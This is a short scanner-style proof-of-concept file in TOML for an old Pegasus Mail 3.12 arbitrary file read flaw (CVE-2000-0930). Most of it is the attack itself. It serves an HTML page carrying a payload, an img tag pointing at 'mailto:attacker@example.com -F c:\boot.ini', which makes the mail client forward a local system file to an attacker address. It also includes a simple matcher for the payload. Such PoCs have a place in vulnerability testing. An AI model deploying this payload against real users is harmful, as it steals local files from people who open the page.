[info]
author = "ave"
description = "通过构造包含 mailto: 协议及 -F 参数的恶意 HTML 页面，诱导目标用户点击后利用 Pegasus Mail 转发功能读取系统任意文件"
id = "POC-AVE-2000-0681"
name = "David Harris Pegasus Mail 3.12 任意文件读取漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0681"]
vuln_id = [
    "CVE-2000-0930",
    "AVE-2000-0681",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc-ave-2000-0681.html"
protocol = "http"

[poc.requests.body]
content = '''
<html>
<body>
<img src="mailto:attacker@example.com -F c:\boot.ini">
</body>
</html>'''
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["mailto"]
